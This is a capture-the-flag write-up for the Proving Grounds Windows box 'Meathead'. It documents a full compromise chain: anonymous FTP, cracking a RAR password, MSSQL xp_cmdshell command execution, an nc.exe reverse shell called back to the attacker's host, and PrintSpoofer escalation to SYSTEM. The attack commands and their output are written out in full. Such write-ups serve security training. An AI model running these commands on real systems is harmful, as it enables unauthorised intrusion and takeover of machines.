---
title: Proving Grounds - Meathead
date: 2022-11-13
author: Marius
tags: [ctf, 'proving grounds', 'pg']
---

OSCP Like Windows box found in Proving Grounds. Box is rated hard by the platform and the community.

### Nmap Scan

```
─$ rustscan -a 192.168.209.70 -- -sC -sV | tee nmap
Open 192.168.209.70:80
Open 192.168.209.70:135
Open 192.168.209.70:139
Open 192.168.209.70:445
Open 192.168.209.70:1221
Open 192.168.209.70:1435
Open 192.168.209.70:3389
Open 192.168.209.70:5985
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV" on ip 
PORT     STATE SERVICE       REASON  VERSION
80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Plantronics
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1221/tcp open  ftp           syn-ack Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-27-20  07:02PM                18866 Elementum Supremum.docx
| 04-27-20  07:02PM               764176 file_example_MP3_700KB.mp3
| 04-27-20  07:02PM                15690 img.jpg
| 04-27-20  07:02PM                  302 MSSQL_BAK.rar
| 04-27-20  07:02PM                  548 palindromes.txt
|_04-27-20  07:02PM                45369 server.jpg
1435/tcp open  ms-sql-s      syn-ack Microsoft SQL Server 2017 14.00.1000.00; RTM
| ssl-cert: OpenSSL required to parse certificate.
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQOCUPUV0F07RGuEJrgLEtfDANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjIwOTIwMDgwODAxWhgPMjA1MjA5MjAwODA4MDFaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMorHkFx
| 1AXWy05gDGDwFjQ98UZyIOuyTwG2HCBAe6iVb4sno1dqso0xTxyGt9hEVMXSbGvA
| 75YRXmm+FwvvT9Holidg4bGs9BMkT4Oc7TukAp+6edci4qoJ6WjgagNHoFlt/MT/
| U2gev0jTn7qQ8dszI+zMmRHETNUxD64C3nvbxSDl4XT1GVpEYykZmDyJYLIi188m
| erPx2YiaWt0XJEJKYYGHntJfrAEkByArQhVgTOWBRH3A7yJyR9Qf8u5qNmxMvIy7
| QXgPMHVboXbPLVDLTnJafFI9/EvEf3vRpT4qvYrRO2ikmMmKUUPG/bs961RHbQop
| qCdUg7rOKkgZX9ECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAhl7HhAKNHPIsqhqu
| 2Jtl9Nei5CLtpBhbSf92NNLDzolCRiv8tgvsrzCp5nqNfbSrG9Y8JuAl05727tdZ
| efBp8ArAG4yAuXzp+MhObIV708WwlKRICE/0RLj5KPpXHNJE5YG4UPvXOG0nvLmE
| 1K5sO7BVgkZoAULrKlI72vwAYJxMQbnrnPZ/Pvh+KPaw0eSeMO9ew7nanu4hSZsF
| xBNO3FQ1AyuLVhQjkCX20nShf+jfDpcn8jA7rHRn4Xz96A2sWCoy5/nVRow0gaL6
| AadmK2XDG3+nJSdmg64erEl/ZPQHFtpavfNASp42EaQ9yyyIpxa3u510ULgCnO/G
| D0dNxg==
|_-----END CERTIFICATE-----
|_ssl-date: 2022-11-13T10:36:45+00:00; -1s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| ssl-cert: OpenSSL required to parse certificate.
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQRQo1rD+rSr5OkktuzZn69jANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhNZWF0aGVhZDAeFw0yMjA4MjcwNTA1NDVaFw0yMzAyMjYwNTA1
| NDVaMBMxETAPBgNVBAMTCE1lYXRoZWFkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAuWILlABWhagQoEzhFgYb5A3QAPva9h/Tc2rTgHveBkoPiy5sOKgQ
| PfG0orWBtJWJZHgO5ok4GyY/vFx01GG64u6ApJHlLuh/ew4aD58sy6f1Mb4StHEv
| Zj2XScTjj6VOEMjbDiL5IPbC48r3qAX6HGuNcyYsf58/Fc0UM7YrKuD8EjkQxBDA
| ammHbeZXO0goyec1oSHlAiEaL64WWNTVC8BMIuZyF2QIk5uhopnzMidLgpywI+1Z
| VDcItok/EiTyq5lEpxb4POWvg0KbU1BBRjuFXuwQgBZe3L0cWyhVg69WpgymUz3H
| Y/mG3jeZ4CGXpdthM9O32/c4JBPl8+5z/QIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAImN0Dh/vQhr
| OQjSf83W+JoilagDOY8tsZP7AsFbHF/Y/KcqPfbELyoz+XcTDeoKG7F0nyKn4LnD
| 2FNX56APv3NeU9OD83s6xDBzBS0/cL3koYvnBuw748uGCM/Evo2MksCmymSJ/wVb
| +ao9eKBKGSC3HMF/H1L411HMGDaZLA8itBEBYSl3Zi5p14uW4uk6Sgn6iz5COCOZ
| aMhQV7FEKy2r7tcGXfu5rEjBIcxhol7GVops5fteRfWhjgZ7PH0yIbDW7TMHesI1
| QvMTbWornBCNoyXa5NUSwAdWwxgM50+/2MphEn3z5geJUiYUpTZoxLsIYbzGiWzv
| MJuSdYzE44A=
|_-----END CERTIFICATE-----
|_ssl-known-key: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2022-11-13T10:36:45+00:00; 0s from scanner time.
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2022-11-13T10:36:09
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35184/tcp): CLEAN (Timeout)
|   Check 2 (port 41938/tcp): CLEAN (Timeout)
|   Check 3 (port 55311/udp): CLEAN (Timeout)
|   Check 4 (port 64185/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```

### Port 80 

Looks to be Plantronics Hub website. 

![alt text](/assets/img/meathead/webpage.png)

By doing a searchsploit search we got a privilege escalation method. I will keep this in mind for later.
```
└─$ searchsploit plantronics
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------- ---------------------------------
Plantronics Hub 3.13.2 - Local Privilege Escalation                                                                    | windows/local/47845.txt   
```
### Port 139,445

SMB access is disabled

```bash
└─$ cme smb 192.168.209.70 -u "guest" -p "" --shares
SMB         192.168.209.70  445    MEATHEAD         [*] Windows Server 2019 Standard 17763 x64 (name:MEATHEAD) (domain:Meathead) (signing:False) (SMBv1:True)
SMB         192.168.209.70  445    MEATHEAD         [-] Meathead\guest: STATUS_ACCOUNT_DISABLED 
SMB         192.168.209.70  445    MEATHEAD         [-] Error enumerating shares: Error occurs while reading from remote(104)
```

### Port 135

Unfortunately no RPC access

```
┌──(kali㉿kali)-[~/ctf/pg_practice/meathead]
└─$ rpcclient -U "" -N 192.168.209.70 
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```


### FTP 1221

As per NMAP scan anonymous access is enabled, so I got all the content to analyze using wget with recursive flag.

```
wget -r ftp://anonymous:anonymous@192.168.209.70:1221
```

Within downloaded files there was MySql backup rar **MYSQL_BAK**.rar which was password encoded. I obtained hash by using rar2john and used john to get the password. 
```bash
┌──(kali㉿kali)-[~/…/pg_practice/meathead/ftp/192.168.209.70:1221]
└─$ rar2john MSSQL_BAK.rar > hash
```

Hash was cracked in couple of minutes using rockyou.txt

```bash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:32 0.44% (ETA: 15:23:03) 0g/s 499.2p/s 499.2c/s 499.2C/s jesus89..isaiah04
letme*******   (MSSQL_BAK.rar)     
1g 0:00:04:39 DONE (2022-11-13 05:53) 0.003580g/s 497.5p/s 497.5c/s 497.5C/s lily03..lerner
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Rar contained **mssql_backup.txt** with credentials to Microsoft SQL account.

```
└─$ cat mssql_backup.txt 
Username: sa
Password: Eject******
```


### MSSQL 1435

Using credentials from FTP I was able to get command execution

```
└─$ impacket-mssqlclient sa:Eject****@192.168.209.70 -port 1435
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MEATHEAD\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MEATHEAD\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> ?

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
SQL> enable_xp_cmdshell
[*] INFO(MEATHEAD\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(MEATHEAD\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell whoami
output                                                                             

--------------------------------------------------------------------------------   
nt service\mssql$sqlexpress       
```

### Local User

Powershell was failing for me so I chose to use nc.exe for reverse shell. Not as elegant as I was expecting, but does the job for this lab.

```
└─$ python -m updog -p 5985
[+] Serving /opt...
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://192.168.2.139:5985/ (Press CTRL+C to quit)
```

```
xp_cmdshell "powershell.exe wget http://192.168.49.209:5985/nc.exe -OutFile c:\\Users\Public\\nc.exe & c:\\Users\Public\\nc.exe -e cmd.exe 192.168.49.209 80"
```

```
└─$ nc -nvlp 80 
listening on [any] 80 ...
connect to [192.168.49.209] from (UNKNOWN) [192.168.209.70] 49931
Microsoft Windows [Version 10.0.17763.1217]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt service\mssql$sqlexpress
```

### Privilege escalation

First things I did was check Windows Access Tokens.

```
C:\Users>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

I noticed that user had **SeImpersonatePrivilege**. And straight away I attempted to exploit [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) vulnerability. I changed my Webserver to use port 80 and downloaded the exploit to temp directory I created in C disk. 

```
C:\temp>curl http://192.168.49.209/PrintSpoofer64.exe -o spoofer.exe
curl http://192.168.49.209/PrintSpoofer64.exe -o spoofer.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 27136  100 27136    0     0  27136      0  0:00:01 --:--:--  0:00:01 86696
```

```
C:\temp>spoofer.exe -i -c powershell.exe
spoofer.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\users\Administrator\Desktop> whoami 
whoami
nt authority\system
```

Looks like I'm in as a system. GG.